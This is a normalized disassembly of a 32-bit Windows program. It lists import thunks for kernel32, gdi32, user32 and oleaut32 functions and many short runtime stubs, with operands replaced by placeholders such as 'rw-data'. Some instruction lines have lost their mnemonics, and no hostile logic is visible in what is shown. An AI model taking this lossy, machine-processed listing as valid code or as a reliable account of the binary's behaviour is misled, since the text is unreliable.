jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetSystemTime
jmp [ __import_lookup_table_6(kernel32:GetSystemTime) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
__imp_LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_40614c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ WinExec@IAT ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ EmptyClipboard@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ __import_lookup_table_9(user32:GetCursorPos) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
InvalidateRect
jmp [ InvalidateRect@IAT ]
IsCharAlphaNumericA
jmp [ IsCharAlphaNumericA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406928
call GetTickCount
retn
sub_406930
xor eax eax
retn
sub_406934
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406944
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406960
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406974
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4069ac
call sub_40691c
retn
sub_4069b4
call sub_40691c
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406b91
jmp sub_4039c0
sub_406b98
pop ebp
retn
sub_406b9c
sub [ rw-data ] 0x1
retn
sub_406bc9
jmp sub_4039c0
sub_406bd0
pop ebp
retn
sub_406bd4
sub [ rw-data ] 0x1
retn
sub_406ed9
jmp sub_4039c0
sub_406ee0
pop ebp
retn
sub_406ee4
sub [ rw-data ] 0x1
retn
sub_4079a1
add eax 0xffffffd4
jmp sub_40cd18
sub_4079a9
add eax 0xffffffd4
jmp sub_40cbc0
sub_4079b1
add eax 0xffffffd4
jmp sub_40cc5c
sub_4079c3
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4056fc
sub_4079cd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405710
sub_407d64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407d2c
test eax eax
sete al
pop esi
pop ebx
retn
sub_40827c
call sub_408258
retn
sub_408314
push eax
call CloseHandle
retn
sub_4084e4
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4084f8
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_4086b8
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4086cc
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408704
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_40876c
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408790
push ebx
mov ebx eax
mov eax ebx
call sub_403fbc
pop ebx
retn
sub_408af3
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403fbc
pop eax
pop ebx
retn
sub_408dab
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408f06
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409263
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409263
sub_409320
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40447c
mov edx esi
xor ecx ecx
call sub_4091ac
pop esi
pop ebx
retn
sub_409394
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40447c
mov edx esi
mov cl 0x1
call sub_4091ac
pop esi
pop ebx
retn
sub_409a0e
jmp sub_4039c0
sub_409a15
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409b06
jmp sub_4039c0
sub_409b0d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a2b1
jmp sub_4039c0
sub_40a2b8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a340
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a2e4
pop ebp
retn 0x8
sub_40a485
jmp sub_4039c0
sub_40a48c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a92f
jmp sub_4039c0
sub_40a936
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ae1b
jmp sub_4039c0
sub_40ae22
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aecd
jmp sub_4039c0
sub_40aed4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40af77
jmp sub_4039c0
sub_40af7e
pop esi
pop ecx
pop ebp
retn
sub_40b15a
jmp sub_4039c0
sub_40b161
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b1b8
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b4aa
jmp sub_4039c0
sub_40b578
jmp sub_4039c0
sub_40b5a0
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403220
sub_40b73c
jmp sub_4039c0
sub_40b743
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b74c
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4039f8
sub_40b759
retn
sub_40b75c
push ebp
mov ebp esp
call sub_40b6a0
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b74c
pop ebp
retn 0x4
sub_40b778
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
retn
sub_40b810
push ebx
mov ebx eax
mov eax ebx
call sub_40b790
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b9e3
jmp sub_4039c0
sub_40b9ea
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40baaf
jmp sub_4039c0
sub_40bab6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bac0
call sub_40b34c
mov eax 0x1
call sub_403fa4
sub_40bc44
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bd1d
jmp sub_4039c0
sub_40bd3a
jmp sub_4039c0
sub_40bd41
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bdec
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bd50
mov ecx eax
sub_40bfd8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40bff8
push eax
call CharNextA
retn
sub_40c2a8
jmp sub_4039c0
sub_40c2af
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c318
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c76f
jmp sub_4039c0
sub_40c776
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40c8b4
jmp sub_4039c0
sub_40c8bb
pop ebx
mov esp ebp
pop ebp
retn
sub_40c8c0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c824
sub_40c8d0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c8ec
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40c974
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c980
xchg [ eax ] edx
mov eax edx
retn
sub_40c9e0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ca70
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cb88
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cbb0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40ce2b
jmp sub_4039c0
sub_40ce32
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cea0
jmp sub_4039c0
sub_40cea7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cec5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cebe
jmp sub_4039c0
sub_40cec5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d315
jmp sub_4039c0
sub_40d31c
pop ebp
retn
sub_40d388
jmp sub_4039c0
sub_40d38f
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d408
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d46e
jmp sub_4039c0
sub_40d475
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d4da
jmp sub_4039c0
sub_40d4e1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d546
jmp sub_4039c0
sub_40d54d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d5b2
jmp sub_4039c0
sub_40d5b9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d61e
jmp sub_4039c0
sub_40d625
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d69d
jmp sub_4039c0
sub_40d6a4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d710
jmp sub_4039c0
sub_40d717
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d780
jmp sub_4039c0
sub_40d787
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d7f4
jmp sub_4039c0
sub_40d7fb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40db81
jmp sub_4039c0
sub_40db88
pop ebp
retn
sub_40db8c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d850
sub_40db9d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e1be
jmp sub_4039c0
sub_40e1c5
pop ecx
pop ebp
retn
sub_40e257
jmp sub_4039c0
sub_40e25e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e2ae
jmp sub_4039c0
sub_40e2b5
pop ecx
pop ebp
retn
sub_40e347
jmp sub_4039c0
sub_40e34e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e39e
jmp sub_4039c0
sub_40e3a5
pop ecx
pop ebp
retn
sub_40e5ed
jmp sub_4039c0
sub_40e5f4
pop ebx
mov esp ebp
pop ebp
retn
sub_40e686
jmp sub_4039c0
sub_40e68d
pop ecx
pop ebp
retn
sub_40e690
push ebx
mov ebx eax
mov eax ebx
call sub_40e928
mov [ ebx ] 0x1
pop ebx
retn
sub_40e928
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e8ac
retn
mov [ eax ] 0x0
retn
sub_40e93c
push eax
call sub_40e928
pop eax
retn
sub_40eb9c
call sub_40ec50
retn
sub_40edba
jmp sub_4039c0
sub_40edc1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee65
jmp sub_4039c0
sub_40ee6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee8e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4046b4
retn
sub_40ee87
jmp sub_4039c0
sub_40ee8e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eeea
jmp sub_4039c0
sub_40eef1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef6d
jmp sub_4039c0
sub_40f4b3
jmp sub_4039c0
sub_40f4ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f54d
jmp sub_4039c0
sub_40f554
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f571
lea eax [ ebp - 0x14 ]
call sub_40469c
retn
sub_40f56a
jmp sub_4039c0
sub_40f571
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f5ce
jmp sub_4039c0
sub_40f5d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f677
jmp sub_4039c0
sub_40f694
jmp sub_4039c0
sub_40f69b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fbf6
jmp sub_4039c0
sub_40fbfd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fca8
push eax
call sub_40e928
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fcbc
push eax
call sub_40e928
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fd34
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40ec50
add esp 0x10
sub_40ffde
jmp sub_4039c0
sub_40ffe5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410028
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e928
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_410040
mov edx 0x80020004
call sub_410028
retn
sub_4100d1
jmp sub_4039c0
sub_4100d8
pop esi
pop ebx
pop ebp
retn
sub_4100dc
push ebp
mov ebp esp
call sub_41029c
pop ebp
retn 0x4
sub_410168
push ebp
mov ebp esp
call sub_41029c
pop ebp
retn 0x4
sub_41024b
jmp sub_4039c0
sub_410252
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40325c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035e0
sub_410274
xor eax eax
retn
sub_410278
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41028c
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410294
call sub_40e174
retn
sub_41029c
call sub_40e264
retn
sub_4102a4
call sub_40e63c
retn
sub_4102ac
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4102c0
call sub_41029c
retn
sub_4102c8
push ebp
mov ebp esp
call sub_4102a4
pop ebp
retn 0x8
sub_4102e0
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4103bc
jmp sub_4039c0
sub_410485
jmp sub_4039c0
sub_41048c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104a9
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
sub_4104a2
jmp sub_4039c0
sub_4104a9
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4104b4
call sub_40e690
retn
sub_41052b
jmp sub_4039c0
sub_410532
pop ebp
retn
sub_4105d5
jmp sub_4039c0
sub_4105dc
pop ebp
retn
sub_4106ed
jmp sub_4039c0
sub_4106f4
pop ebp
retn
sub_4106f8
sub [ rw-data ] 0x1
retn
sub_41072c
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_4109b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_404010
pop esi
pop ebx
retn
sub_410a4c
jmp sub_4039c0
sub_410a53
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410b4e
jmp sub_4039c0
sub_410b55
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
